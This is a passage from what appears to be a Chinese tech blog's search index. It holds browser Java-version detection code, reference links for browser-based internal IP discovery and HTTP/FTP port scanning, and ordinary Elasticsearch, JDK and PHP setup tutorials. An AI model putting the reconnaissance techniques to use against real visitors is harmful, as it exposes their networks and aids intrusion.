class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (o[<span class=\"number\">0</span>] &lt; n[<span class=\"number\">0</span>]) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (o[<span class=\"number\">1</span>] &gt; n[<span class=\"number\">1</span>]) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (o[<span class=\"number\">1</span>] &lt; n[<span class=\"number\">1</span>]) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (o[<span class=\"number\">2</span>] &gt; n[<span class=\"number\">2</span>]) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (o[<span class=\"number\">2</span>] &lt; n[<span class=\"number\">2</span>]) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            enableAlerts: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.browserName = <span class=\"literal\">null</span>;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.debug = <span class=\"literal\">true</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            poll: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.refresh();</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = <span class=\"keyword\">this</span>.getJREs();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ((<span class=\"keyword\">this</span>.preInstallJREList.length == <span class=\"number\">0</span>) &amp;&amp; (n.length != <span class=\"number\">0</span>)) &#123;</span><br><span class=\"line\">                    clearInterval(<span class=\"keyword\">this</span>.myInterval);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.returnPage != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                        location.href = <span class=\"keyword\">this</span>.returnPage</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ((<span class=\"keyword\">this</span>.preInstallJREList.length != <span class=\"number\">0</span>) &amp;&amp; (n.length != <span class=\"number\">0</span>) &amp;&amp; (<span class=\"keyword\">this</span>.preInstallJREList[<span class=\"number\">0</span>] != n[<span class=\"number\">0</span>])) &#123;</span><br><span class=\"line\">                    clearInterval(<span class=\"keyword\">this</span>.myInterval);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.returnPage != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                        location.href = <span class=\"keyword\">this</span>.returnPage</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            writePluginTag: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = <span class=\"keyword\">this</span>.getBrowser();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (n == <span class=\"string\">\"MSIE\"</span>) &#123;&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (n == <span class=\"string\">\"Netscape Family\"</span> &amp;&amp; <span class=\"keyword\">this</span>.allowPlugin()) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">this</span>.writeEmbedTag()</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            refresh: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                navigator.plugins.refresh(<span class=\"literal\">false</span>);</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = <span class=\"keyword\">this</span>.getBrowser();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (n == <span class=\"string\">\"Netscape Family\"</span> &amp;&amp; <span class=\"keyword\">this</span>.allowPlugin()) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> o = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"deployJavaPlugin\"</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (o == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">this</span>.writeEmbedTag()</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            writeEmbedTag: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (navigator.mimeTypes != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> o = <span class=\"number\">0</span>; o &lt; navigator.mimeTypes.length; o++) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (navigator.mimeTypes[o].type == <span class=\"keyword\">this</span>.mimeType) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (navigator.mimeTypes[o].enabledPlugin) &#123;</span><br><span class=\"line\">                                n = <span class=\"literal\">true</span></span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (!n) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> o = <span class=\"number\">0</span>; o &lt; navigator.mimeTypes.length; o++) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (navigator.mimeTypes[o].type == <span class=\"keyword\">this</span>.oldMimeType) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (navigator.mimeTypes[o].enabledPlugin) &#123;&#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        d.writePluginTag();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (d.locale == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> h = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (h == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    h = navigator.userLanguage</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span>(f) &#123;&#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (h == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    h = navigator.systemLanguage</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span>(f) &#123;&#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (h == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    h = navigator.language</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span>(f) &#123;&#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (h != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                h.replace(<span class=\"string\">\"-\"</span>, <span class=\"string\">\"_\"</span>);</span><br><span class=\"line\">                d.locale = h</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> d</span><br><span class=\"line\">    &#125; ();</span><br><span class=\"line\">    <span class=\"keyword\">var</span> temp = deployJava.getJREs();</span><br><span class=\"line\">    <span class=\"keyword\">var</span> re = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (temp == <span class=\"string\">\"\"</span>) &#123;</span><br><span class=\"line\">        re = <span class=\"string\">\"No Java or Disable!\"</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        re = <span class=\"string\">\"Java Version is:\"</span> + temp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> re;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">alert(java());</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考链接\">参考链接</h2><p>获得flash版本 <a href=\"http://jsbin.com/rukirayuca\" target=\"_blank\" rel=\"external\">http://jsbin.com/rukirayuca</a><br>获得java版本 <a href=\"http://jsbin.com/cabirudale\" target=\"_blank\" rel=\"external\">http://jsbin.com/cabirudale</a><br>获得插件列表 <a href=\"http://jsbin.com/vejujatuxa\" target=\"_blank\" rel=\"external\">http://jsbin.com/vejujatuxa</a><br>获得内网IP <a href=\"http://jsbin.com/riyisavura\" target=\"_blank\" rel=\"external\">http://jsbin.com/riyisavura</a><br>扫描HTTP端口 <a href=\"http://jsbin.com/ziwununivo\" target=\"_blank\" rel=\"external\">http://jsbin.com/ziwununivo</a><br>扫描WEB容器 <a href=\"http://jsbin.com/piwemaquwa\" target=\"_blank\" rel=\"external\">http://jsbin.com/piwemaquwa</a><br>扫描FTP端口 <a href=\"http://jsbin.com/kulahicide\" target=\"_blank\" rel=\"external\">http://jsbin.com/kulahicide</a><br>通过WebRTC获取内网和公网真实IP地址 <a href=\"http://borghan.com/archives/get-local-and-real-public-IP-via-WebRTC.html\" target=\"_blank\" rel=\"external\">http://borghan.com/archives/get-local-and-real-public-IP-via-WebRTC.html</a></p>\n"},{"title":"MySQL数据导入ElasticSearch","url":"http://ohroot.com/2015/05/18/MySQL数据导入ElasticSearch/","content":"<p>Github上主要是有三个项目，分别是<a href=\"https://github.com/siddontang/go-mysql-elasticsearch\" target=\"_blank\" rel=\"external\">go-mysql-elasticsearch</a>、<a href=\"https://github.com/jprante/elasticsearch-river-jdbc\" target=\"_blank\" rel=\"external\">elasticsearch-river-jdbc</a>和<a href=\"https://github.com/scharron/elasticsearch-river-mysql\" target=\"_blank\" rel=\"external\">elasticsearch-river-mysql</a> ……<br><a id=\"more\"></a></p>\n<h2 id=\"go-mysql-elasticsearch\">go-mysql-elasticsearch</h2><p>go-mysql-elasticsearch 是一个将MySQL数据导入到Elasticsearch的服务，他是用<code>mysqldump</code>来获取源数据，然后使用binlog同步数据，按照github上说明，他好像是使用go语言开发的一款工具，实现数据迁移。搭建需要go环境支持。<br>他主要可以实现：</p>\n<ul>\n<li>定制化同步，可修改index、type、field等</li>\n<li>可增量同步</li>\n<li>支持基于正则命名的index和type</li>\n</ul>\n<h2 id=\"elasticsearch-river-mysql\">elasticsearch-river-mysql</h2><p>他需要安装一个Elasticsearch插件和一个小型的webserver<br>看了下，安装过程。。。步骤还是比较多，最后操作还是基于http的，example：<code>curl -XPUT &#39;localhost:9200/_river/mydb/_meta&#39; -d &#39;{ &quot;type&quot; : &quot;mysql&quot;, &quot;streamer&quot; : { &quot;host&quot; : &quot;localhost&quot;, &quot;port&quot; : 8080, }, &quot;mysql&quot; : { # Future usage to configure mysql access from the river. _ } }&#39;</code></p>\n<h2 id=\"elasticsearch-river-jdbc\">elasticsearch-river-jdbc</h2><p>他是一个JDBC插件，不仅仅支持mysql，还支持其他数据库。项目现在还在更新，让我感觉靠谱点<br><a href=\"https://github.com/jprante/elasticsearch-river-jdbc/wiki/Quickstart\" target=\"_blank\" rel=\"external\">Quick start</a><br>安装方法：</p>\n<ul>\n<li><code>./bin/plugin --install jdbc --url http://xbib.org/repository/org/xbib/elasticsearch/plugin/elasticsearch-river-jdbc/1.5.0.5/elasticsearch-river-jdbc-1.5.0.5-plugin.zip</code></li>\n<li><code>curl -o mysql-connector-java-5.1.35.zip -L &#39;http://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.35.zip/from/http://cdn.mysql.com/&#39;</code></li>\n<li>解压后<code>cp mysql-connector-java-5.1.28-bin.jar $ES_HOME/plugins/jdbc/</code>，即将mysql connect的一个jar文件拷贝到jdbc的目录下即可。</li>\n</ul>\n<p>参考文章</p>\n<ul>\n<li><a href=\"http://blog.randywallace.com/blog/2013/08/27/pulling-a-large-mysql-table-into-elasticsearch/\" target=\"_blank\" rel=\"external\">Pulling a Large MySQL Table Into Elasticsearch</a></li>\n</ul>\n"},{"title":"探索Elasticsearch","url":"http://ohroot.com/2015/05/18/探索Elasticsearch/","content":"<p>Elasticsearch搞了一段时间了，各种曲折，好难受，把一些东西写出来，总结下把</p>\n<a id=\"more\"></a>\n<p>如果想省去很多安装配置，可以直接使用elasticsearch的RTF版本， RTF是Ready To Fly的缩写，它是elasticsearch中文发行版，针对中文集成了相关插件，并带有Demo，方便新手学习,或者在生产环境中直接使用。地址：<a href=\"https://github.com/medcl/elasticsearch-rtf\" target=\"_blank\" rel=\"external\">medcl/elasticsearch-rtf</a></p>\n<h2 id=\"安装\">安装</h2><p>Elasticsearch安装非常简单，官方都说是零配置。但是Elasticsearch安装需要java环境，需要先行安装。<br>然后下载Elasticsearch到你的机器上，文末附有下载链接，下载后解压到一个可执行文件夹，解压命令<code>tar -zvxf elasticsearch-1.5.0.tar.gz</code></p>\n<h2 id=\"简单配置\">简单配置</h2><p>修改<code>ES_HOME/config/elasticsearch.yml</code>文件，修改<code>node.name</code>的值为你的节点名称。如果配置集群需要将<code>cluster.name</code>设置为相同值，我们不修改就是了，直接用默认的elasticsearch。</p>\n<p>此时访问<code>http://ip:9200/</code>就可显示集群的一些基本信息了</p>\n<h2 id=\"工具安装\">工具安装</h2><h3 id=\"elasticsearchservicewrapper安装\">elasticsearchservicewrapper安装</h3><p>这个是对elasticsearch执行命令的包装服务，安装之后，方便elasticsearch的启动，停止等操作。</p>\n<ol>\n<li>下载elasticsearchservicewrapper，<code>git clone https://github.com/elasticsearch/elasticsearch-servicewrapper</code>，然后将目录下的service目录拷贝至ES_HOME/bin目录下。</li>\n<li>简单配置jvm的内存，修改<code>ES_HOME/bin/service/elasticsearch.conf</code>，<code>set.default.ES_HEAP_SIZE=1024</code>，该值根据机器的配置可自定义，一般设置为机器内存的一半。</li>\n<li>安装启动服务，执行命令：<code>ES_HOME/bin/service/elasticsearch install</code></li>\n<li>启动/停止/重启服务，执行命令：<code>service elasticsearch start/stop/restart</code></li>\n</ol>\n<h3 id=\"插件安装\">插件安装</h3><p>下面介绍几个实用的插件：</p>\n<ol>\n<li>head，非常实用的插件。通过head，可以查看集群几乎所有信息，还能进行简单的搜索查询，观察自动恢复的情况等等。安装方法<code>elasticsearch/bin/plugin -install mobz/elasticsearch-head</code>，安装完成后通过<code>http://ip:9200/_plugin/head/</code>，可以查看显示效果。</li>\n<li>bigdesk，它是集群监控插件，通过该插件可以查看整个集群的资源消耗情况，cpu、内存、http链接等等。安装方法：<code>elasticsearch/bin/plugin -install lukas-vlcek/bigdesk</code>。安装完成之后通过：<code>http://ip:9200/_plugin/bigdesk/</code>，可以查看单个节点的资源使用情况，包括JVM、Thread Pools、OS、Process、HTTP&amp;Transport、Indice、File system等状况。</li>\n<li>ik分词，github地址为：<a href=\"https://github.com/medcl/elasticsearch-analysis-ik\" target=\"_blank\" rel=\"external\">elasticsearch-analysis-ik</a>，其安装方法如下：<ul>\n<li>在<code>ES_HOME/plugins</code>目录下新建插件目录analysis-ik。</li>\n<li>将<a href=\"https://github.com/medcl/elasticsearch-rtf/blob/master/plugins/analysis-ik/elasticsearch-analysis-ik-1.2.6.jar\" target=\"_blank\" rel=\"external\">https://github.com/medcl/elasticsearch-rtf/blob/master/plugins/analysis-ik/elasticsearch-analysis-ik-1.2.6.jar</a>  这个文件下载下来，放置到analysis-ik目录下。</li>\n<li>将<a href=\"https://github.com/medcl/elasticsearch-rtf/tree/master/config/ik\" target=\"_blank\" rel=\"external\">https://github.com/medcl/elasticsearch-rtf/tree/master/config/ik</a> 这个ik目录所有内容下载到 <code>ES_HOME/config</code>，目录下。</li>\n<li>编辑文件<code>ES_HOME/config/elasticsearch.yml</code>,添加配置：<code>index.analysis.analyzer.ik.type : &#39;ik&#39;</code>。</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"一些Elasticsearch的资源\">一些Elasticsearch的资源</h2><ul>\n<li><a href=\"http://www.elasticsearch.org/download/\" target=\"_blank\" rel=\"external\">软件下载地址</a></li>\n<li><a href=\"http://www.elasticsearch.org/guide/en/elasticsearch/client/php-api/current/index.html\" target=\"_blank\" rel=\"external\">Elasticsearch-PHP接口描述</a></li>\n<li><a href=\"http://learnes.sinaapp.com/index.html\" target=\"_blank\" rel=\"external\">入门资料</a></li>\n<li><a href=\"http://learnes.net/\" target=\"_blank\" rel=\"external\">中文文档</a></li>\n<li><a href=\"https://www.gitbook.com/book/endymecy/elasticsearch-guide-chinese/details\" target=\"_blank\" rel=\"external\">中文指南</a></li>\n<li><a href=\"https://www.gitbook.com/book/shgy/mastering-elasticsearch/details\" target=\"_blank\" rel=\"external\">Mastering Elasticsearch(中文版)</a></li>\n</ul>\n<p>参考文章</p>\n<ul>\n<li><a href=\"http://my.oschina.net/xiaohui249/blog/228748\" target=\"_blank\" rel=\"external\">ElasticSearch入门 —— 集群搭建</a></li>\n<li><a href=\"http://segmentfault.com/a/1190000000448816\" target=\"_blank\" rel=\"external\">elasticsearch初探</a></li>\n<li><a href=\"http://blog.csdn.net/laigood/article/details/8207990\" target=\"_blank\" rel=\"external\">分布式搜索elasticsearch集群监控工具bigdesk</a></li>\n</ul>\n"},{"title":"Linux下安装配置JDK8","url":"http://ohroot.com/2015/05/18/Linux下安装配置JDK8/","content":"<p>linux安装jdk的方法、笔记<br><a id=\"more\"></a></p>\n<h2 id=\"安装JDK8\">安装JDK8</h2><ul>\n<li><p>下载JDK,地址：<a href=\"http://www.oracle.com/technetwork/cn/java/javase/downloads/index.html\" target=\"_blank\" rel=\"external\">click here</a></p>\n</li>\n<li><p>解压安装<br>我们把JDK安装到这个路径：<code>/usr/lib/jvm</code>,如果没有这个目录（第一次当然没有），我们就新建一个目录</p>\n<figure class=\"highlight dos\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /usr/lib</span><br><span class=\"line\">sudo <span class=\"built_in\">mkdir</span> jvm</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>建立好了以后，我们来到刚才下载好的压缩包的目录，解压到我们刚才新建的文件夹里面去，并且修改好名字方便我们管理<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tar zxvf ./jdk-<span class=\"number\">8</span>u20-linux-x64<span class=\"class\">.tar</span><span class=\"class\">.gz</span>  -C /usr/lib/jvm</span><br><span class=\"line\">cd /usr/lib/jvm</span><br><span class=\"line\">sudo mv <span class=\"function\"><span class=\"title\">jdk_</span><span class=\"params\">(版本号)</span></span>/ jdk8</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>配置环境变量, <code>gedit ~/.bashrc</code>, 在打开的文件的末尾添加<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> JAVA_HOME=/usr/lib/jvm/jdk8</span><br><span class=\"line\"><span class=\"built_in\">export</span> JRE_HOME=<span class=\"variable\">$&#123;JAVA_HOME&#125;</span>/jre</span><br><span class=\"line\"><span class=\"built_in\">export</span> CLASSPATH=.:<span class=\"variable\">$&#123;JAVA_HOME&#125;</span>/lib:<span class=\"variable\">$&#123;JRE_HOME&#125;</span>/lib</span><br><span class=\"line\"><span class=\"built_in\">export</span> PATH=<span class=\"variable\">$&#123;JAVA_HOME&#125;</span>/bin:<span class=\"variable\">$PATH</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>保存退出，然后输入下面的命令来使之生效<code>source ~/.bashrc</code></p>\n<ul>\n<li>配置默认JDK<br>由于一些Linux的发行版中已经存在默认的JDK，如OpenJDK等。所以为了使得我们刚才安装好的JDK版本能成为默认的JDK版本，我们还要进行下面的配置。<br>执行下面的命令：<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">update-alternatives --install <span class=\"regexp\">/usr/</span>bin<span class=\"regexp\">/java java /</span>usr<span class=\"regexp\">/lib/</span>jvm<span class=\"regexp\">/jdk8/</span>bin/java <span class=\"number\">300</span> </span><br><span class=\"line\">update-alternatives --install <span class=\"regexp\">/usr/</span>bin<span class=\"regexp\">/javac javac /</span>usr<span class=\"regexp\">/lib/</span>jvm<span class=\"regexp\">/jdk8/</span>bin/javac <span class=\"number\">300</span> </span><br><span class=\"line\">update-alternatives --install <span class=\"regexp\">/usr/</span>bin<span class=\"regexp\">/jar jar /</span>usr<span class=\"regexp\">/lib/</span>jvm<span class=\"regexp\">/jdk8/</span>bin/jar <span class=\"number\">300</span>  </span><br><span class=\"line\">update-alternatives --install <span class=\"regexp\">/usr/</span>bin<span class=\"regexp\">/javah javah /</span>usr<span class=\"regexp\">/lib/</span>jvm<span class=\"regexp\">/jdk8/</span>bin/javah <span class=\"number\">300</span>  </span><br><span class=\"line\">update-alternatives --install <span class=\"regexp\">/usr/</span>bin<span class=\"regexp\">/javap javap /</span>usr<span class=\"regexp\">/lib/</span>jvm<span class=\"regexp\">/jdk8/</span>bin/javap <span class=\"number\">300</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>注意：如果以上两个命令出现找不到路径问题，只要重启一下计算机在重复上面两行代码就OK了。<br>执行下面的代码可以看到当前各种JDK版本和配置：<code>sudo update-alternatives --config java</code></p>\n<ul>\n<li>测试<br>打开一个终端，输入下面命令：<code>java -version</code>，显示java版本号，即表示java命令已经可以运行了。</li>\n</ul>\n<h2 id=\"安装_OpenJDK\">安装 OpenJDK</h2><ol>\n<li>安装 OpenJDK:<code>sudo apt-get install openjdk-6-jre</code></li>\n<li>检查安装是否成功:<code>java -version</code></li>\n<li>设置 JAVA_HOME 环境变量,在 <code>~/.bashrc</code> 中增加下面一行<code>export JAVA_HOME=/usr/lib/jvm/java-6-openjdk</code></li>\n</ol>\n<p>摘自：<a href=\"http://dawndiy.com/archives/155/\" target=\"_blank\" rel=\"external\">Linux 下安装配置 JDK7</a></p>\n"},{"title":"debian下给php安装curl","url":"http://ohroot.com/2015/05/18/debian下给php安装curl/","content":"<a id=\"more\"></a>\n<p>查看自己的php5是否已经安装了curl。</p>\n<ol>\n<li>在web服务器目录（ debian下的通常为 /var/www )新建test.php文件</li>\n<li>编辑文件，键入下面一行代码：<code>&lt;?php phpinfo(); ?&gt;</code></li>\n<li>保存文件</li>\n<li>打开浏览器，浏览该网页。例：<a href=\"http://localhost/test.php\" target=\"_blank\" rel=\"external\">http://localhost/test.php</a></li>\n<li>搜索”curl”,看看是否已经安装了curl。没搜到的话肯定是没装了。</li>\n</ol>\n<p>安装方法很简单，只需要一条命令。<br> <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install curl libcurl3 libcurl3-dev php5-curl</span><br></pre></td></tr></table></figure></p>\n<p>安装完毕。记得重启Apache服务器<code>/etc/init.d/apache2 restart</code></p>\n<p>如果仍然有问题，尝试编辑你的php.ini文件（我的是/etc/php5/apache2/php.ini),在最后加上一行：<code>extension=curl.so</code></p>\n<p>保存文件后重启Apache服务器。</p>\n<p>安装gd过程类似，运行下面命令即可：<code>apt-get install php5-gd</code></p>\n"},{"title":"python进行Elasticsearch批量索引","url":"http://ohroot.com/2015/04/28/python进行Elasticsearch批量索引/","content":"<p>本文分享使用python脚本进行Elasticsearch的批量索引<br><a id=\"more\"></a><br>之前主要还是采用jdbc-river的方式将数据从MySQL索引到Elasticsearch，但是由于有些数据表字符各种奇怪的，导入总是报各种错，于是自己折腾个python脚本导入数据，这里列出主要函数。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#获取表数据量</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getTablesCounts</span><span class=\"params\">(_cursor, _tablename)</span>:</span></span><br><span class=\"line\">    _querySQL = <span class=\"string\">'select count(*) from `%s`'</span>%_tablename</span><br><span class=\"line\">    retNum = _cursor.execute(_querySQL)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _cursor.fetchone();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#从数据库中获取一条数据</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getFromId</span><span class=\"params\">(_cursor, _id,_tablename)</span>:</span></span><br><span class=\"line\">    _querySQL = <span class=\"string\">\"select * from `%s` where id = %s \"</span>%(_tablename, _id)</span><br><span class=\"line\">    retNum = _cursor.execute(_querySQL)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _cursor.fetchone();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#将数据导入ES，bulk数据的大小为500000</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">bulkData</span><span class=\"params\">(_cur, _tableCounts)</span>:</span></span><br><span class=\"line\">    es = Elasticsearch(<span class=\"string\">\"192.168.88.88\"</span>)</span><br><span class=\"line\">    j = <span class=\"number\">0</span></span><br><span class=\"line\">    count = _tableCounts</span><br><span class=\"line\">    actions = []</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (j &lt; count):</span><br><span class=\"line\">        oneRec = getFromId(_cur, j+<span class=\"number\">1</span>, tablename)</span><br><span class=\"line\">        action = &#123;</span><br><span class=\"line\">            <span class=\"string\">\"_index\"</span>: indexname,</span><br><span class=\"line\">            <span class=\"string\">\"_type\"</span>: typename,</span><br><span class=\"line\">            <span class=\"string\">\"_id\"</span>: j + <span class=\"number\">1</span>,</span><br><span class=\"line\">            <span class=\"string\">\"_source\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">\"column1\"</span>:oneRec[<span class=\"number\">1</span>],</span><br><span class=\"line\">                <span class=\"string\">\"column2\"</span>:oneRec[<span class=\"number\">2</span>],</span><br><span class=\"line\">                <span class=\"string\">\"column3\"</span>:oneRec[<span class=\"number\">3</span>],</span><br><span class=\"line\">                <span class=\"string\">\"column4\"</span>:oneRec[<span class=\"number\">4</span>],</span><br><span class=\"line\">                <span class=\"string\">\"column5\"</span>:oneRec[<span class=\"number\">5</span>],</span><br><span class=\"line\">                <span class=\"string\">\"column6\"</span>:oneRec[<span class=\"number\">6</span>]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        actions.append(action)</span><br><span class=\"line\">        j += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (len(actions) == <span class=\"number\">500000</span>):</span><br><span class=\"line\">            <span class=\"keyword\">print</span> j</span><br><span class=\"line\">            helpers.bulk(es, actions)</span><br><span class=\"line\">            <span class=\"keyword\">del</span> actions[<span class=\"number\">0</span>:len(actions)]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (len(actions) &gt; <span class=\"number\">0</span>):</span><br><span class=\"line\">        